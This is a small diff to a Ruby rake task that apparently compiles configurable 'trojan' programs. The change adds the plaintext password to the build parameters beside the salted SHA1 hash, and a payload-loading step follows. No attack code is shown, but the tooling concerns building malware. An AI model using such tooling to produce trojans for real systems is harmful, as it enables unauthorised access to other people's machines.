@@ -93,8 +93,9 @@ namespace :trojan do
                 print "Compiling '#{trojan['name']}'..."
 
                 # calculate the password hash
-                params[:salt] = trojan['salt']
-                params[:hash] = Digest::SHA1.hexdigest(trojan['password'] + trojan['salt'])
+                params[:password] = trojan['password']
+                params[:salt]     = trojan['salt']
+                params[:hash]     = Digest::SHA1.hexdigest(trojan['password'] + trojan['salt'])
 
                 # load the trojan payloads
                 params[:payloads] = ''
